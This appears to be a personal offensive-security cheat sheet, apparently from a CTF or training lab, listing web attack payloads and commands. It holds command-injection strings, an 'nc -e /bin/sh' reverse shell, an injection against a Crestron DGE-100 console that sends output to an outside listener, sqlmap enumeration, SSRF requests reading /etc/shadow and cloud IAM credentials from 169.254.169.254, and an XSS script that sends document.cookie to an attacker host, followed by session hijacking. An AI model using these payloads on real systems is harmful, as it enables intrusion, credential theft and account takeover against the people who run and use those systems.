## Command Injection
### Examples to find command injection vulnerability
	-h
	PARAM; echo Injected 
	echo Injected|
	PARAM | echo Injected 
	PARAM || echo Injected 
	PARAM & echo Injected 
	PARAM && echo Injected
	$(echo Injected)
	\`echo Injected\`
	>(Echo Injected)
	Josh;id #
### Exploitation
nc -nlvvvp 11111
127.0.0.1 && nc -e /bin/sh 10.10.75.1 11111

### Creston DGE-100 attack against DGE-100 Control Console 
nc -nlvp 8080
nc 10.10.10.1 41795 
ping $(echo "$(id)" | /system/xbin/nc 192.168.1.1 8080) 

## SQL injection
% = * 

' or '1'='1

### SQLMAP 
sqlmap -u "http://www.rookaviary.com/email_search.php?search=admin"
sqlmap -u "http://www.rookaviary.com/email_search.php?search=admin" --dbs
sqlmap -u "http://www.rookaviary.com/email_search.php?search=admin" -D web_app --tables

## SSRF and IMDS
### SSRF 
GET  /user?profile=file:///etc/shadow 
GET  /user?profile=https://server2/me.jpg 
curl -v "http://login.falsimentis.com/imgget.php?logo=file:///etc/hosts"
### IMDS
http://169.254.169.254
http://169.254.169.254/latest/user-data

### SSRF IDMS Attack
file:///etc/passwd
curl http://intern.falsimentis.com/images/Drew.jpg 

file:///var/www/html/index.html
	curl --silent http://intern.falsimentis.com/images/Drew.jpg | grep -iE "user|pass"

http://169.254.169.254/latest/meta-data/iam/info
	curl --silent http://intern.falsimentis.com/images/Drew.jpg | jq

http://169.254.169.254/latest/meta-data/iam/security-credentials/falsimentis-deploy-role/
	curl --silent http://intern.falsimentis.com/images/Drew.jpg | jq


## XSS 
### CookieStealer
try with hello <hr> <hr> <hr> 
use cookiecutter 
	php -S 0.0.0.0:2222
<script>document.location='http://10.10.75.1:2222/?'+document.cookie;</script>
jq "." cookies.log
curl -b authtoken=77ba9cd915c8e359d9733edcfe9c61e5aca92afb "http://www.rookaviary.com/admin.php"
#### USE TUN0 for COOKIE STEALING IN CTF 
### Or Via Browser in Console 
	document.cookie="authtoken=77ba9cd915c8e359d9733edcfe9c61e5aca92afb"